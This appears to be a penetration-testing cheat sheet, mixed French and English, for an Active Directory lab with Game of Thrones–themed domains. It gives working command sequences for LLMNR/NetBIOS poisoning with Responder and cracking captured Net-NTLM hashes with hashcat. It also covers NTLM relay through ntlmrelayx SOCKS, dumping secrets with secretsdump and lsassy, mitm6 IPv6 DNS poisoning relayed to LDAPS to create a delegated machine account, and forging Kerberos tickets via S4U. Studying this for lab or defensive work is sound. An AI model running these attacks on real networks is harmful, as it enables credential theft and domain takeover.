# Poison and Relay

## Responder

Répondre aux requêtes LLMNR et NETBIOS pour récupérer les hash net-ntlm

```
responder -I eth1
```

Voir les logs de Responder

```bash
ls -l /usr/share/responder/logs/
```

If you want to delete the previous captured logs (message skipped previously captured hash) delete the file `/usr/share/responder/Responder.db`

create a file responder.hashes with the two hashes found, and crack them

```bash
hashcat -m5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt 
```

## NTLM Relay

Générer une liste de cibles avec SMB signing : false

```bash
nxc smb 192.168.56.10-23 --gen-relay-list relay.txt
```

Stop the responder smb and http server as we don’t want to get the hashes directly but we want to relay them to ntlmrelayx -> /usr/share/responder/Responder.conf

```bash
sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf
```

Démarrer Responder pour empoisonner les réponses aux requêtes et les rediriger vers NTLMrelayx qui va host un proxy socks que l'on utilisera par la suite pour réaliser des actions sur les devices sur lesquels une sessions est ouverte.

```bash
impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
sudo responder -I eth1
```

### Use a socks relay with an admin account

#### Dump secrets

```bash
# ! POSSIBLE DETECTION ET BLOCAGE AV/EDR !
proxychains impacket-secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
```

#### SMB

```
proxychains impacket-smbclient -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
proxychains impacket-smbexec -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
```

## Mitm6 + ntlmrelayx to ldap

Empoisonne les requêtes DNSv6 sur le réseau pour rediriger les clients vers un serveur WPAD contrôlé.

<pre class="language-bash"><code class="lang-bash"><strong>mitm6 -i eth1 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug
</strong></code></pre>

Relaye l'authentification NTLM interceptée vers LDAPS pour créer un compte machine avec délégation RBCD.

```bash
ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --add-computer relayedpccreate --delegate-access
```

Vérifie si un compte dispose de droits de délégation sur des machines cibles dans l’AD.

```bash
impacket-findDelegation essos.local/relayedpccreate\$:'ttrJB6qsD;B3BSn' -dc-ip 192.168.56.12
```

Forge un ticket Kerberos pour un utilisateur ciblé via S4U2Proxy en exploitant une délégation RBCD.

```bash
impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/relayedpccreate$:ttrJB6qsD;B3BSn'
```

If we specify a loot dir all the informations on the ldap are automatically dumped

```
ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot
```

## Coerced auth smb + ntlmrelayx to ldaps with drop the mic <a href="#coerced-auth-smb--ntlmrelayx-to-ldaps-with-drop-the-mic" id="coerced-auth-smb--ntlmrelayx-to-ldaps-with-drop-the-mic"></a>
